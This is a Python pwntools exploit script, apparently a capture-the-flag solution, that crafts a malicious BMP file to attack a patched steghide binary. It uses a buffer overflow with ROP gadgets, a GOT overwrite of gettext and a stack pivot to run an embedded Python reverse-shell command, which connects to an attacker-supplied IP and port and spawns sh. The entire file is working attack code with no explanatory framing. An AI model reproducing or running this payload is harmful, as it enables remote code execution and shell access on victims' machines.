from pwn import *
from pwnlib import *
import sys

ip = sys.argv[1]
port = int(sys.argv[2])

exe = ELF('./steghide_patched', checksec=False)

pop_rax_rbx_rbp = 0x0000000000414d29
pop_rsi = 0x0000000000417f3e
pop_rdx = 0x000000000042cd0c
pop_rdi = 0x0000000000450e8b
add_irbp_ebx = 0x0000000000404a38
pop_rbp = 0x0000000000404a39
leave_ret = 0x000000000040a392
syscall = 0x00000000004066b3
addr = 0x48a930
movinrbp_rdi = 0x00000000004220e0

headerfile = b'BMzL\x02\x00\x00\x00\x00\x00>\x00\x00\x00(\x00\x00\x00\xd3\x05\x00\x00!\x03\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00<L\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00'
shellrv = f'python3 -c \x27import os,pty,socket;s=socket.socket();s.connect((\x22{ip}\x22,{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\x22sh\x22)\x27\x00'
shell = headerfile + b'a'*(len(shellrv)-10 - 8)

shell += flat(
    pop_rax_rbx_rbp+1, 0x13e10, exe.got['gettext'] + 0x3d,
    add_irbp_ebx,
    pop_rdi, 0x48abd4,
    exe.sym['gettext'],
    word_size=64, sign = True
)
shell += shellrv.encode()*29
shell = shell.ljust(0x24c71, b'\xff') + 0x3e*b'a'

rop = flat(
    addr,
    movinrbp_rdi, addr + 8,
    pop_rdi, addr,
    movinrbp_rdi, addr + 0x20,
    pop_rdx, 0x6d0,
    0x41B355,
    pop_rbp, addr,
    leave_ret,
    word_size=64, sign = True
)

shell += rop

with open('test.bmp', 'wb') as f:
  f.write(shell)


